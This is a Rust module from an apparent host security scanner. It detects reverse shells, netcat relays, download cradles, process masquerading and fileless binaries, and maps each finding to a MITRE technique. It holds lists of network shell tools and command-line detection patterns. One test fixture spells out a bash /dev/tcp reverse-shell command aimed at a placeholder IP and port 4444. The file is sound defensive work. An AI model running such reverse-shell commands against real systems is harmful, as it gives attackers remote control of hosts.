use crate::models::{
    ConnectionEntry, ExposureScope, IpCategory, ProcessRecord, SecurityFinding, Severity,
};
use crate::scanner::ports_db::{check_backdoor_port, check_sensitive_wildcard_port};
use std::collections::{HashMap, HashSet};

const SHELL_NAMES: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "tcsh",
    "csh",
    "fish",
    "cmd.exe",
    "cmd",
    "powershell.exe",
    "powershell",
    "pwsh.exe",
    "pwsh",
];

const NETCAT_TOOLS: &[&str] = &[
    "nc",
    "nc.exe",
    "ncat",
    "ncat.exe",
    "netcat",
    "netcat.exe",
    "socat",
    "socat.exe",
    "cryptcat",
    "powercat",
];

const SERVER_PARENTS: &[&str] = &[
    "nginx",
    "apache2",
    "httpd",
    "httpd.exe",
    "w3wp.exe",
    "php-fpm",
    "php-cgi",
    "php-cgi.exe",
    "sqlservr.exe",
    "mysqld",
    "mysqld.exe",
    "postgres",
    "postgres.exe",
    "redis-server",
    "mongod",
    "mongod.exe",
    "tomcat",
];

#[derive(Default)]
struct FindingCollector {
    items: Vec<SecurityFinding>,
    seen: HashSet<String>,
}

impl FindingCollector {
    fn contains(&self, key: &str) -> bool {
        self.seen.contains(key)
    }

    fn insert(&mut self, key: String, finding: SecurityFinding) {
        if self.seen.insert(key) {
            self.items.push(finding);
        }
    }
}

pub fn evaluate_security_heuristics(
    connections: &mut [ConnectionEntry],
    processes: &mut HashMap<u32, ProcessRecord>,
) -> Vec<SecurityFinding> {
    let mut collector = FindingCollector::default();

    for conn in connections.iter_mut() {
        evaluate_connection(conn, &mut collector);
    }

    for proc_rec in processes.values_mut() {
        evaluate_process(proc_rec, &mut collector);
    }

    for conn in connections.iter() {
        if let Some(pid) = conn.pid {
            if let Some(proc_rec) = processes.get_mut(&pid) {
                if conn.severity > proc_rec.max_severity {
                    proc_rec.max_severity = conn.severity;
                }
            }
        }
    }

    collector.items.sort_by(|a, b| {
        b.severity
            .cmp(&a.severity)
            .then_with(|| a.rule_id.cmp(&b.rule_id))
    });

    collector.items
}

fn evaluate_connection(conn: &mut ConnectionEntry, collector: &mut FindingCollector) {
    let proc_lower = conn.process_name.to_lowercase();
    let exe_lower = conn.exe_path.to_lowercase().replace('/', "\\");
    let cmd_lower = conn.cmdline.to_lowercase();
    let is_listening = conn.is_listening();

    if SHELL_NAMES.contains(&proc_lower.as_str()) {
        conn.elevate_severity(
            Severity::Critical,
            format!(
                "Command shell '{}' owns a network socket ({})",
                conn.process_name, conn.state
            ),
        );
        collector.insert(
            format!("H01-SHELL-{}-{:?}", conn.process_name, conn.pid),
            SecurityFinding {
                rule_id: "H01-REV-SHELL".to_string(),
                category: "Reverse / Bind Shell".to_string(),
                mitre_id: "T1059".to_string(),
                severity: Severity::Critical,
                title: format!("Active Socket Bound to Shell ({})", conn.process_name),
                description: format!(
                    "Shell '{}' (PID {}) holds a {} socket on {} -> {}.",
                    conn.process_name,
                    conn.pid.unwrap_or(0),
                    conn.protocol.as_str(),
                    conn.local_endpoint(),
                    conn.remote_display()
                ),
                pid: conn.pid,
                process_name: Some(conn.process_name.clone()),
                endpoint: Some(format!(
                    "{} -> {}",
                    conn.local_endpoint(),
                    conn.remote_endpoint()
                )),
                evidence: format!(
                    "Lineage: {} | Cmd: {}",
                    conn.lineage.join(" -> "),
                    conn.cmdline
                ),
                remediation: "Terminate the process tree and inspect the parent process.".to_string(),
            },
        );
    }

    if NETCAT_TOOLS.contains(&proc_lower.as_str()) {
        conn.elevate_severity(
            Severity::Critical,
            format!("Socket relay tool '{}' active on network", conn.process_name),
        );
        collector.insert(
            format!("H01-NETCAT-{}-{:?}", conn.process_name, conn.pid),
            SecurityFinding {
                rule_id: "H01-RAW-RELAY".to_string(),
                category: "Socket Relay Utility".to_string(),
                mitre_id: "T1095".to_string(),
                severity: Severity::Critical,
                title: format!("Netcat / Socat Relay Active ({})", conn.process_name),
                description: format!(
                    "Relay utility '{}' (PID {}) is {} on {}.",
                    conn.process_name,
                    conn.pid.unwrap_or(0),
                    conn.state,
                    conn.local_endpoint()
                ),
                pid: conn.pid,
                process_name: Some(conn.process_name.clone()),
                endpoint: Some(conn.local_endpoint()),
                evidence: format!("Cmd: {} | Exe: {}", conn.cmdline, conn.exe_path),
                remediation: "Terminate if unauthorized and check user persistence.".to_string(),
            },
        );
    }

    if is_scripting_reverse_shell(&proc_lower, &cmd_lower) {
        conn.elevate_severity(
            Severity::Critical,
            "Scripting interpreter running inline socket/PTY payload".to_string(),
        );
        collector.insert(
            format!("H01-SCRIPT-SHELL-{:?}", conn.pid),
            SecurityFinding {
                rule_id: "H01-INLINE-SHELL".to_string(),
                category: "Reverse Shell".to_string(),
                mitre_id: "T1059.006".to_string(),
                severity: Severity::Critical,
                title: format!("Inline Scripting Reverse Shell ({})", conn.process_name),
                description: format!(
                    "Interpreter '{}' (PID {}) is running inline socket/shell primitives connected to {}.",
                    conn.process_name,
                    conn.pid.unwrap_or(0),
                    conn.remote_display()
                ),
                pid: conn.pid,
                process_name: Some(conn.process_name.clone()),
                endpoint: Some(format!(
                    "{} -> {}",
                    conn.local_endpoint(),
                    conn.remote_endpoint()
                )),
                evidence: format!("Cmdline: {}", conn.cmdline),
                remediation: "Terminate the interpreter process and inspect its parent.".to_string(),
            },
        );
    }

    if let Some(reason) = check_suspicious_exec_path(&conn.exe_path, &exe_lower) {
        conn.elevate_severity(Severity::Critical, reason.clone());
        collector.insert(
            format!("H02-NET-PATH-{:?}-{}", conn.pid, conn.exe_path),
            SecurityFinding {
                rule_id: "H02-TEMP-NET-EXEC".to_string(),
                category: "Suspicious Execution Path".to_string(),
                mitre_id: "T1204".to_string(),
                severity: Severity::Critical,
                title: format!(
                    "Network-Active Binary in Temp/Writable Path ({})",
                    conn.process_name
                ),
                description: format!(
                    "Process '{}' (PID {}) has active socket {} while running from {}.",
                    conn.process_name,
                    conn.pid.unwrap_or(0),
                    conn.local_endpoint(),
                    reason
                ),
                pid: conn.pid,
                process_name: Some(conn.process_name.clone()),
                endpoint: Some(conn.local_endpoint()),
                evidence: format!("Exe: {}", conn.exe_path),
                remediation: "Quarantine the binary and terminate the process.".to_string(),
            },
        );
    }

    if is_listening || conn.local_port < 32768 {
        if let Some(intel) = check_backdoor_port(conn.local_port) {
            conn.elevate_severity(
                intel.severity,
                format!("{}: {}", intel.threat_name, intel.reason),
            );
            collector.insert(
                format!("H05-LOCAL-PORT-{}-{:?}", conn.local_port, conn.pid),
                SecurityFinding {
                    rule_id: "H05-BACKDOOR-PORT".to_string(),
                    category: "Suspicious Port".to_string(),
                    mitre_id: "T1571".to_string(),
                    severity: intel.severity,
                    title: format!(
                        "Port {} Associated with {} ({})",
                        conn.local_port, intel.threat_name, conn.process_name
                    ),
                    description: format!(
                        "{} Process '{}' (PID {}) is using local port {} ({}).",
                        intel.reason,
                        conn.process_name,
                        conn.pid.unwrap_or(0),
                        conn.local_port,
                        conn.state
                    ),
                    pid: conn.pid,
                    process_name: Some(conn.process_name.clone()),
                    endpoint: Some(conn.local_endpoint()),
                    evidence: format!(
                        "Endpoint: {} | Process: {} | Exe: {}",
                        conn.local_endpoint(),
                        conn.process_name,
                        conn.exe_path
                    ),
                    remediation: "Verify whether this listener is intentional; otherwise terminate and block the port.".to_string(),
                },
            );
        }
    }

    if let Some(rem_port) = conn.remote_port {
        if let Some(intel) = check_backdoor_port(rem_port) {
            conn.elevate_severity(
                intel.severity,
                format!("Outbound connection to {}: {}", intel.threat_name, intel.reason),
            );
            collector.insert(
                format!("H05-REM-PORT-{}-{:?}", rem_port, conn.pid),
                SecurityFinding {
                    rule_id: "H05-OUTBOUND-C2-PORT".to_string(),
                    category: "Suspicious Outbound Port".to_string(),
                    mitre_id: "T1571".to_string(),
                    severity: intel.severity,
                    title: format!(
                        "Outbound Connection to Port {} ({})",
                        rem_port, intel.threat_name
                    ),
                    description: format!(
                        "Process '{}' (PID {}) is connected to {} on port {}. {}",
                        conn.process_name,
                        conn.pid.unwrap_or(0),
                        conn.remote_display(),
                        rem_port,
                        intel.reason
                    ),
                    pid: conn.pid,
                    process_name: Some(conn.process_name.clone()),
                    endpoint: Some(conn.remote_endpoint()),
                    evidence: format!(
                        "{} -> {} | Exe: {}",
                        conn.local_endpoint(),
                        conn.remote_display(),
                        conn.exe_path
                    ),
                    remediation: "Block the remote IP at the firewall and inspect the binary.".to_string(),
                },
            );
        }
    }

    if is_listening && conn.exposure == ExposureScope::WildcardAllInterfaces {
        if let Some(rule) = check_sensitive_wildcard_port(conn.local_port) {
            conn.elevate_severity(
                rule.severity,
                format!(
                    "{} (port {}) bound to all interfaces (0.0.0.0/::)",
                    rule.service, rule.port
                ),
            );
            collector.insert(
                format!("H06-WILDCARD-{}-{}", conn.local_port, conn.process_name),
                SecurityFinding {
                    rule_id: "H06-EXPOSED-SERVICE".to_string(),
                    category: "Exposed Network Service".to_string(),
                    mitre_id: "T1190".to_string(),
                    severity: rule.severity,
                    title: format!(
                        "{} (Port {}) Exposed on All Interfaces",
                        rule.service, rule.port
                    ),
                    description: format!(
                        "{} Process '{}' (PID {}) is listening on {}.",
                        rule.risk_summary,
                        conn.process_name,
                        conn.pid.unwrap_or(0),
                        conn.local_endpoint()
                    ),
                    pid: conn.pid,
                    process_name: Some(conn.process_name.clone()),
                    endpoint: Some(conn.local_endpoint()),
                    evidence: format!(
                        "Listener: {} ({}) | Process: {} | Exe: {}",
                        conn.local_endpoint(),
                        conn.protocol.as_str(),
                        conn.process_name,
                        conn.exe_path
                    ),
                    remediation: rule.remediation.to_string(),
                },
            );
        } else if conn.protocol.is_tcp() && conn.service_name != "Win-RPC-Dyn" {
            conn.elevate_severity(
                Severity::Low,
                "TCP listener bound to all interfaces (0.0.0.0 / ::)".to_string(),
            );
        }
    }

    if conn.remote_category == IpCategory::PublicInternet
        && conn.exe_path.is_empty()
        && conn.pid.unwrap_or(0) > 4
        && !crate::scanner::network::is_windows_rpc_system_process(&conn.process_name)
    {
        conn.elevate_severity(
            Severity::Low,
            "External connection from process with unresolvable binary path".to_string(),
        );
    }
}

fn evaluate_process(proc_rec: &mut ProcessRecord, collector: &mut FindingCollector) {
    let name_lower = proc_rec.name.to_lowercase();
    let exe_lower = proc_rec.exe_path.to_lowercase().replace('/', "\\");
    let cmd_lower = proc_rec.cmdline.to_lowercase();

    if proc_rec.is_deleted_binary {
        proc_rec.max_severity = Severity::Critical;
        collector.insert(
            format!("H03-DELETED-{}", proc_rec.pid),
            SecurityFinding {
                rule_id: "H03-FILELESS-BINARY".to_string(),
                category: "Unlinked / Deleted Binary".to_string(),
                mitre_id: "T1620".to_string(),
                severity: Severity::Critical,
                title: format!(
                    "Process Running from Deleted or Memory Binary ({})",
                    proc_rec.name
                ),
                description: format!(
                    "Process '{}' (PID {}) is executing from an unlinked binary or memfd descriptor ('{}').",
                    proc_rec.name, proc_rec.pid, proc_rec.exe_path
                ),
                pid: Some(proc_rec.pid),
                process_name: Some(proc_rec.name.clone()),
                endpoint: None,
                evidence: format!(
                    "Exe: {} | Cmd: {} | Lineage: {}",
                    proc_rec.exe_path,
                    proc_rec.cmdline,
                    proc_rec.lineage.join(" -> ")
                ),
                remediation: "Inspect /proc/<pid>/exe before terminating the process.".to_string(),
            },
        );
    }

    if let Some((sev, reason)) =
        check_process_masquerading(&name_lower, &exe_lower, &proc_rec.exe_path)
    {
        if sev > proc_rec.max_severity {
            proc_rec.max_severity = sev;
        }
        collector.insert(
            format!("H04-MASQ-{}", proc_rec.pid),
            SecurityFinding {
                rule_id: "H04-MASQUERADING".to_string(),
                category: "Process Masquerading".to_string(),
                mitre_id: "T1036.005".to_string(),
                severity: sev,
                title: format!(
                    "System Process Masquerading: {} (PID {})",
                    proc_rec.name, proc_rec.pid
                ),
                description: reason,
                pid: Some(proc_rec.pid),
                process_name: Some(proc_rec.name.clone()),
                endpoint: None,
                evidence: format!(
                    "Exe: {} | Lineage: {}",
                    proc_rec.exe_path,
                    proc_rec.lineage.join(" -> ")
                ),
                remediation: "Verify the binary hash against clean OS files and terminate if unauthorized.".to_string(),
            },
        );
    }

    if let Some(reason) = check_suspicious_exec_path(&proc_rec.exe_path, &exe_lower) {
        let sev = if proc_rec.open_sockets_count > 0 {
            Severity::Critical
        } else {
            Severity::High
        };
        if sev > proc_rec.max_severity {
            proc_rec.max_severity = sev;
        }
        let net_key = format!("H02-NET-PATH-{:?}-{}", Some(proc_rec.pid), proc_rec.exe_path);
        if !collector.contains(&net_key) {
            collector.insert(
                format!("H02-PROC-PATH-{}", proc_rec.pid),
                SecurityFinding {
                    rule_id: "H02-TEMP-EXEC".to_string(),
                    category: "Suspicious Execution Path".to_string(),
                    mitre_id: "T1204".to_string(),
                    severity: sev,
                    title: format!(
                        "Process Running from Temp/Writable Directory ({})",
                        proc_rec.name
                    ),
                    description: format!(
                        "Process '{}' (PID {}) is executing from {}.",
                        proc_rec.name, proc_rec.pid, reason
                    ),
                    pid: Some(proc_rec.pid),
                    process_name: Some(proc_rec.name.clone()),
                    endpoint: None,
                    evidence: format!("Exe: {} | Cmd: {}", proc_rec.exe_path, proc_rec.cmdline),
                    remediation: "Verify if an installer is active; otherwise quarantine the binary.".to_string(),
                },
            );
        }
    }

    if SHELL_NAMES.contains(&name_lower.as_str()) && proc_rec.lineage.len() >= 2 {
        let parent_entry = proc_rec.lineage[proc_rec.lineage.len() - 2].to_lowercase();
        if SERVER_PARENTS.iter().any(|&srv| parent_entry.starts_with(srv)) {
            proc_rec.max_severity = Severity::Critical;
            collector.insert(
                format!("H06-WEBSHELL-{}", proc_rec.pid),
                SecurityFinding {
                    rule_id: "H06-SERVER-SHELL".to_string(),
                    category: "Webshell / Server RCE".to_string(),
                    mitre_id: "T1505.003".to_string(),
                    severity: Severity::Critical,
                    title: format!("Server Daemon Spawned Shell ({})", proc_rec.name),
                    description: format!(
                        "Shell '{}' (PID {}) was spawned by server process '{}'.",
                        proc_rec.name,
                        proc_rec.pid,
                        proc_rec.lineage.join(" -> ")
                    ),
                    pid: Some(proc_rec.pid),
                    process_name: Some(proc_rec.name.clone()),
                    endpoint: None,
                    evidence: format!(
                        "Lineage: {} | Cmd: {}",
                        proc_rec.lineage.join(" -> "),
                        proc_rec.cmdline
                    ),
                    remediation: "Isolate the service, inspect server logs, and kill the process tree.".to_string(),
                },
            );
        }
    }

    if let Some((sev, indicator)) = check_suspicious_cmdline(&name_lower, &cmd_lower) {
        if sev > proc_rec.max_severity {
            proc_rec.max_severity = sev;
        }
        collector.insert(
            format!("H07-CMDLINE-{}", proc_rec.pid),
            SecurityFinding {
                rule_id: "H07-OBFUSCATED-CMD".to_string(),
                category: "Suspicious Command Line".to_string(),
                mitre_id: "T1027".to_string(),
                severity: sev,
                title: format!(
                    "Suspicious Command-Line Payload in {} (PID {})",
                    proc_rec.name, proc_rec.pid
                ),
                description: format!(
                    "Process '{}' launched with arguments matching: {}.",
                    proc_rec.name, indicator
                ),
                pid: Some(proc_rec.pid),
                process_name: Some(proc_rec.name.clone()),
                endpoint: None,
                evidence: format!("Cmdline: {}", proc_rec.cmdline),
                remediation: "Decode the payload, inspect parent process lineage, and terminate if unauthorized.".to_string(),
            },
        );
    }
}

impl ConnectionEntry {
    pub fn elevate_severity(&mut self, sev: Severity, reason: String) {
        if sev > self.severity {
            self.severity = sev;
        }
        if !self.risk_reasons.contains(&reason) {
            self.risk_reasons.push(reason);
        }
    }
}

fn is_scripting_reverse_shell(proc_lower: &str, cmd_lower: &str) -> bool {
    let is_script_engine = proc_lower.starts_with("python")
        || proc_lower.starts_with("perl")
        || proc_lower.starts_with("ruby")
        || proc_lower.starts_with("php")
        || proc_lower.starts_with("lua")
        || proc_lower == "awk"
        || proc_lower == "gawk";

    if !is_script_engine {
        return false;
    }

    let indicators = [
        "socket.socket",
        "pty.spawn",
        "/bin/sh",
        "/bin/bash",
        "tcpsocket.open",
        "tcpsocket.new",
        "fsockopen(",
        "subprocess.call",
        "subprocess.popen",
        "os.dup2(",
        "/dev/tcp/",
    ];

    indicators.iter().any(|&ind| cmd_lower.contains(ind))
}

fn check_suspicious_exec_path(raw_path: &str, exe_lower: &str) -> Option<String> {
    if raw_path.is_empty() {
        return None;
    }

    if raw_path.starts_with("/tmp/")
        || raw_path.starts_with("/var/tmp/")
        || raw_path.starts_with("/dev/shm/")
        || raw_path.starts_with("/run/shm/")
    {
        return Some(format!(
            "Linux temporary/shared-memory directory ({})",
            raw_path
        ));
    }

    let win_suspicious = [
        ("\\appdata\\local\\temp\\", "User AppData Local Temp folder"),
        ("\\windows\\temp\\", "Windows system Temp folder"),
        ("\\users\\public\\", "Windows Public Users folder"),
        ("\\$recycle.bin\\", "Windows Recycle Bin"),
        ("\\perflogs\\", "Windows PerfLogs directory"),
    ];

    for (pattern, desc) in win_suspicious {
        if exe_lower.contains(pattern) {
            return Some(format!("{} ({})", desc, raw_path));
        }
    }

    None
}

fn check_process_masquerading(
    name_lower: &str,
    exe_lower: &str,
    raw_exe: &str,
) -> Option<(Severity, String)> {
    let typosquats = [
        ("scvhost.exe", "svchost.exe"),
        ("svch0st.exe", "svchost.exe"),
        ("svchosts.exe", "svchost.exe"),
        ("lsas.exe", "lsass.exe"),
        ("1sass.exe", "lsass.exe"),
        ("isass.exe", "lsass.exe"),
        ("csrs.exe", "csrss.exe"),
        ("cssrs.exe", "csrss.exe"),
        ("expl0rer.exe", "explorer.exe"),
    ];
    for (fake, real) in typosquats {
        if name_lower == fake {
            return Some((
                Severity::Critical,
                format!(
                    "Process name '{}' is a typosquat of system binary '{}'.",
                    fake, real
                ),
            ));
        }
    }

    if (name_lower.starts_with("[kworker")
        || name_lower.starts_with("[kthreadd")
        || name_lower.starts_with("[ksoftirqd")
        || name_lower.starts_with("[migration")
        || name_lower.starts_with("[rcu_"))
        && !raw_exe.is_empty()
    {
        return Some((
            Severity::Critical,
            format!(
                "Userland binary '{}' is masquerading as a Linux kernel thread ('{}').",
                raw_exe, name_lower
            ),
        ));
    }

    if !exe_lower.is_empty() {
        let win_sys32_only = [
            "svchost.exe",
            "lsass.exe",
            "csrss.exe",
            "services.exe",
            "smss.exe",
            "wininit.exe",
            "winlogon.exe",
            "dwm.exe",
            "spoolsv.exe",
            "taskhostw.exe",
        ];
        if win_sys32_only.contains(&name_lower) {
            let valid = exe_lower.contains(":\\windows\\system32\\")
                || exe_lower.contains(":\\windows\\syswow64\\")
                || exe_lower.contains(":\\windows\\winsxs\\");
            if !valid {
                return Some((
                    Severity::Critical,
                    format!(
                        "Windows system process '{}' is running from non-standard path '{}'.",
                        name_lower, raw_exe
                    ),
                ));
            }
        }
    }

    None
}

fn check_suspicious_cmdline(name_lower: &str, cmd_lower: &str) -> Option<(Severity, &'static str)> {
    if name_lower.starts_with("powershell") || name_lower.starts_with("pwsh") {
        if cmd_lower.contains(" -enc ")
            || cmd_lower.contains(" -encodedcommand ")
            || cmd_lower.contains("frombase64string")
        {
            return Some((
                Severity::High,
                "Base64-encoded PowerShell command (-EncodedCommand / FromBase64String)",
            ));
        }
        if cmd_lower.contains("downloadstring(")
            || cmd_lower.contains("downloaddata(")
            || (cmd_lower.contains("iex") && cmd_lower.contains("http"))
            || (cmd_lower.contains("invoke-expression") && cmd_lower.contains("http"))
        {
            return Some((
                Severity::Critical,
                "PowerShell remote download cradle (IEX / DownloadString)",
            ));
        }
    }

    if cmd_lower.contains("/dev/tcp/") || cmd_lower.contains("/dev/udp/") {
        return Some((
            Severity::Critical,
            "Bash /dev/tcp or /dev/udp socket redirection",
        ));
    }

    if (cmd_lower.contains("curl ") || cmd_lower.contains("wget "))
        && (cmd_lower.contains("| sh")
            || cmd_lower.contains("| bash")
            || cmd_lower.contains("|sh")
            || cmd_lower.contains("|bash"))
    {
        return Some((
            Severity::High,
            "Remote script piped directly into shell (curl/wget | sh)",
        ));
    }

    if cmd_lower.contains("nc -e ")
        || cmd_lower.contains("ncat -e ")
        || cmd_lower.contains("mkfifo /tmp/")
    {
        return Some((
            Severity::Critical,
            "Netcat -e / named-pipe reverse shell execution",
        ));
    }

    if (name_lower.starts_with("mshta")
        || name_lower.starts_with("regsvr32")
        || name_lower.starts_with("rundll32"))
        && (cmd_lower.contains("http://")
            || cmd_lower.contains("https://")
            || cmd_lower.contains("javascript:")
            || cmd_lower.contains("vbscript:"))
    {
        return Some((
            Severity::Critical,
            "Windows LOLBin (mshta/regsvr32/rundll32) executing remote or scriptlet payload",
        ));
    }

    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::{Protocol, Severity};
    use std::net::{IpAddr, Ipv4Addr};

    #[test]
    fn test_reverse_shell_and_backdoor_port_detection() {
        let mut connections = vec![ConnectionEntry {
            id: 1,
            protocol: Protocol::Tcp,
            local_ip: IpAddr::V4(Ipv4Addr::new(192, 168, 1, 50)),
            local_port: 51234,
            remote_ip: Some(IpAddr::V4(Ipv4Addr::new(198, 51, 100, 99))),
            remote_port: Some(4444),
            remote_hostname: None,
            state: "ESTABLISHED".to_string(),
            pid: Some(9001),
            process_name: "bash".to_string(),
            exe_path: "/usr/bin/bash".to_string(),
            cmdline: "bash -i".to_string(),
            sha256: None,
            lineage: vec!["nginx(400)".to_string(), "bash(9001)".to_string()],
            service_name: "Metasploit/C2".to_string(),
            exposure: ExposureScope::LocalLan,
            remote_category: IpCategory::PublicInternet,
            severity: Severity::Safe,
            risk_reasons: Vec::new(),
        }];

        let mut processes = HashMap::new();
        processes.insert(
            9001,
            ProcessRecord {
                pid: 9001,
                ppid: Some(400),
                name: "bash".to_string(),
                exe_path: "/usr/bin/bash".to_string(),
                cmdline: "bash -i >& /dev/tcp/198.51.100.99/4444 0>&1".to_string(),
                user: "www-data".to_string(),
                sha256: None,
                lineage: vec!["nginx(400)".to_string(), "bash(9001)".to_string()],
                cpu_usage: 0.5,
                memory_bytes: 4096,
                run_time_secs: 15,
                exe_exists_on_disk: true,
                is_deleted_binary: false,
                open_sockets_count: 1,
                max_severity: Severity::Safe,
            },
        );

        let findings = evaluate_security_heuristics(&mut connections, &mut processes);
        assert_eq!(connections[0].severity, Severity::Critical);
        assert!(findings.iter().any(|f| f.rule_id == "H01-REV-SHELL"));
        assert!(findings.iter().any(|f| f.rule_id == "H05-OUTBOUND-C2-PORT"));
        assert!(findings.iter().any(|f| f.rule_id == "H06-SERVER-SHELL"));
        assert!(findings.iter().any(|f| f.rule_id == "H07-OBFUSCATED-CMD"));
    }

    #[test]
    fn test_masquerading_and_deleted_binary_detection() {
        let mut connections = Vec::new();
        let mut processes = HashMap::new();

        processes.insert(
            6660,
            ProcessRecord {
                pid: 6660,
                ppid: Some(1000),
                name: "svchost.exe".to_string(),
                exe_path: r"C:\Users\admin\AppData\Local\Temp\svchost.exe".to_string(),
                cmdline: r"C:\Users\admin\AppData\Local\Temp\svchost.exe".to_string(),
                user: "admin".to_string(),
                sha256: None,
                lineage: vec!["explorer.exe(1000)".to_string(), "svchost.exe(6660)".to_string()],
                cpu_usage: 12.0,
                memory_bytes: 1024 * 1024,
                run_time_secs: 60,
                exe_exists_on_disk: true,
                is_deleted_binary: false,
                open_sockets_count: 0,
                max_severity: Severity::Safe,
            },
        );

        processes.insert(
            7770,
            ProcessRecord {
                pid: 7770,
                ppid: Some(1),
                name: "[kworker/0:1]".to_string(),
                exe_path: "/dev/shm/.kworker (deleted)".to_string(),
                cmdline: "[kworker/0:1]".to_string(),
                user: "root".to_string(),
                sha256: None,
                lineage: vec!["systemd(1)".to_string(), "[kworker/0:1](7770)".to_string()],
                cpu_usage: 95.0,
                memory_bytes: 8 * 1024 * 1024,
                run_time_secs: 300,
                exe_exists_on_disk: false,
                is_deleted_binary: true,
                open_sockets_count: 1,
                max_severity: Severity::Safe,
            },
        );

        let findings = evaluate_security_heuristics(&mut connections, &mut processes);
        assert!(findings.iter().any(|f| f.rule_id == "H04-MASQUERADING" && f.pid == Some(6660)));
        assert!(findings.iter().any(|f| f.rule_id == "H02-TEMP-EXEC" && f.pid == Some(6660)));
        assert!(findings.iter().any(|f| f.rule_id == "H03-FILELESS-BINARY" && f.pid == Some(7770)));
        assert!(findings.iter().any(|f| f.rule_id == "H04-MASQUERADING" && f.pid == Some(7770)));
    }
}
